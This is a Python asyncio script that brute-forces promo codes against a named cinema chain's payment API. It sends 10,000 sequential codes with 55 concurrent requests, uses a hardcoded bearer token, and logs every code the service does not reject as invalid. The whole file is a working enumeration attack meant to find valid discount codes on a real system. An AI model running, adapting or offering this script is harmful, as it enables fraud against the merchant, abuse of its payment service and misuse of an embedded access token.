import time
import asyncio
import async_timeout
from aiohttp import ClientSession

from utils import log


BATCH_SIZE = 10000
CONCURRENCY_LIMIT = 55
TRANSACTION_ID = 22088723
SEAT_ID = 100001
LAST_SAVEPOINT = 20024912030629
RETRY_SLEEP = 10


async def get_json(session, url, params=None, headers=None):
    params = params or {}
    headers = headers or {}
    async with async_timeout.timeout(10):
        async with session.get(url, params=params,
                               headers=headers) as response:
            return await response.json()


async def bound_fetch(sem, session, url, **kwargs):
    async with sem:
        try:
            return await get_json(session, url, **kwargs)
        except asyncio.TimeoutError:
            log.debug('Timeout, trying once again...')
            await asyncio.sleep(RETRY_SLEEP)
            try:
                return await get_json(session, url, **kwargs)
            except asyncio.TimeoutError:
                log.error('Skipping...')
                return {}


async def check_results(results):
    for index, result in enumerate(results):
        if 'data' in result:
            mes = result['data']['user_Message']
            if 'не знайдено' in mes:
                log.debug('%s is invalid', index)
            else:
                log.warning(result)
        else:
            log.error('Unexpected result: %s', result)
            continue


async def run():
    url = 'https://pay.planetakino.ua/api/v1/cart/check-promocode'
    default_params = {
        'transactionId': TRANSACTION_ID,
        'theaterId': 'imax-kiev',
        'seatId': SEAT_ID,
    }
    headers = {
        'authorization': 'Bearer 4f6507711933412ba688b6c7849dff99',
    }
    tasks = []
    # create instance of Semaphore
    sem = asyncio.Semaphore(CONCURRENCY_LIMIT)

    # Create client session that will ensure we dont open new connection
    # per each request.
    async with ClientSession() as session:
        for i in range(BATCH_SIZE):
            params = default_params.copy()
            code = LAST_SAVEPOINT + i + 1
            params.update({'promoCode': code})
            task = asyncio.ensure_future(
                bound_fetch(sem, session, url, params=params, headers=headers)
            )
            tasks.append(task)

        responses = asyncio.gather(*tasks)
        results = await responses
        await check_results(results)


if __name__ == '__main__':
    start_time = time.time()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run())
    end_time = time.time()
    elapsed = end_time - start_time
    log.info('Batch of %s items took to check %s seconds',
             BATCH_SIZE, int(elapsed))
